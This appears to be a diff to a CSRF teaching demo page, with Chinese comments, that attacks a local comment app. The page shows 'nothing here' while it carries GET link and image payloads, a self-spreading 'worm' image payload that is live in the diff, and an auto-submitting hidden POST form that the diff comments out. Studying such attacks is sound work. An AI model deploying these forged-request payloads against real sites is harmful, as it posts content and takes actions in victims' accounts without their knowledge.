@@ -6,10 +6,24 @@
 	</head>
 	<body>
 		hello，这里什么也没有。
-		<script>
+		<!-- get的CSRF -->
+
+		<!-- 需要点击 -->
+		<!-- <a href="http://127.0.0.1:8080/ajax/addComment?postId=11&content=我是来自GET的CSRF">点击就送屠龙宝刀！！！</a> -->
+
+		<!-- 不需要点击 -->
+		<!-- <img src="http://127.0.0.1:8080/ajax/addComment?postId=11&content=我是来自GET的不用点击的CSRF" alt=""> -->
+
+		<!-- 循环攻击（蠕虫攻击) -->
+		<!-- a标签内容通过 encodeUrIComponent进行转译，否则链接会有问题 -->
+		<img src="http://127.0.0.1:8080/ajax/addComment?postId=11&content=<a href=http%3A%2F%2F127.0.0.1%3A8080%2Fajax%2FaddComment%3FpostId%3D11%26content%3D%E6%88%91%E6%98%AF%E6%9D%A5%E8%87%AA%E5%B5%8C%E5%A5%97%E5%9B%BE%E7%89%87GET%E7%9A%84CSRF>点击就送屠龙宝刀！！！</a>" alt="">
+
+		<!-- post的CSRF -->
+		<!-- <script>
+			// 默认form表单会跳转页面，通过target可以指向iframe，这样跳转发生在iframe
 			document.write(`
-				<form name="commentForm" target="csrf" method="post" action="http://localhost:1521/post/addComment">
-					<input name="postId" type="hidden" value="1">
+				<form name="commentForm" target="csrf" method="post" action="http://localhost:8080/post/addComment">
+					<input name="postId" type="hidden" value="11">
 					<textarea name="content">来自CSRF！</textarea>
 				</form>`
 			);
@@ -23,5 +37,5 @@
 				document.querySelector('[name=commentForm]').submit();
 			},1000);
 		</script>
-	</body>
+	</body> -->
 </html>
